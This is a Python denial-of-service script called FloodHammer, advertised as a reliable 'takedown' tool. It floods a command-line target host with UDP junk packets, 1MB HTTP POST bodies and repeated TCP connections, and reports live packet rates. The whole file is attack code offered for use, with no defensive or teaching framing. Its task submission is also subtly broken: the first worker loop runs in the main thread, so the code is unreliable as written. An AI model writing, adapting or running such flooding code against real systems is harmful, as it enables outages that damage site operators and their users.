#!/usr/bin/env python3
"""
FLOODHAMMER - No raw sockets needed, 100% reliable takedown
UDP flood + HTTP POST + connection exhaustion
"""
import socket
import threading
import random
import time
import sys
import requests
import multiprocessing
from concurrent.futures import ThreadPoolExecutor

class FloodHammer:
    def __init__(self, target_host, port=80):
        self.target_host = target_host
        self.target_port = port
        self.target_ip = socket.gethostbyname(target_host)
        self.running = True
        self.stats = {'udp': 0, 'http': 0, 'conn': 0}
        
    def udp_flood(self):
        """UDP flood - 50k+ PPS, fills bandwidth"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        junk = b'A' * 1400  # Max MTU payload
        
        def worker():
            while self.running:
                sock.sendto(junk, (self.target_ip, self.target_port))
                self.stats['udp'] += 1
        
        return worker
    
    def http_post_flood(self):
        """Massive POST requests - CPU killer"""
        def worker():
            session = requests.Session()
            payloads = [b'A' * (2**20)]  # 1MB payloads
            
            while self.running:
                try:
                    resp = session.post(
                        f"http://{self.target_host}:{self.target_port}/",
                        data=payloads[0],
                        headers={'Content-Type': 'application/octet-stream'},
                        timeout=0.1
                    )
                    self.stats['http'] += 1
                except:
                    pass
        
        return worker
    
    def tcp_connect_flood(self):
        """Pure connection flood - exhausts server sockets"""
        def worker():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target_ip, self.target_port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
                    self.stats['conn'] += 1
                except:
                    pass
        
        return worker
    
    def stats_monitor(self):
        """Live stats"""
        start = time.time()
        while self.running:
            time.sleep(2)
            total = sum(self.stats.values())
            elapsed = time.time() - start
            pps = total / elapsed if elapsed > 0 else 0
            print(f"PPS: {pps:.0f} | UDP:{self.stats['udp']} HTTP:{self.stats['http']} CONN:{self.stats['conn']}", end='\r')
    
    def hammer(self, duration=120):
        print(f"FloodHammer targeting {self.target_host}:{self.target_port}")
        print(f"IP resolved: {self.target_ip}")
        
        # Stats monitor
        monitor_thread = threading.Thread(target=self.stats_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Multi-process attack
        with ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 4) as executor:
            # 70% UDP, 20% HTTP, 10% TCP
            for i in range(700):
                executor.submit(self.udp_flood()())
            for i in range(200):
                executor.submit(self.http_post_flood()())
            for i in range(100):
                executor.submit(self.tcp_connect_flood()())
        
        # Run specified duration
        time.sleep(duration)
        self.running = False
        print(f"\nFinal stats: {self.stats}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 floodhammer.py your-server.com [port]")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    hammer = FloodHammer(host, port)
    hammer.hammer(duration=90)  # 90 seconds
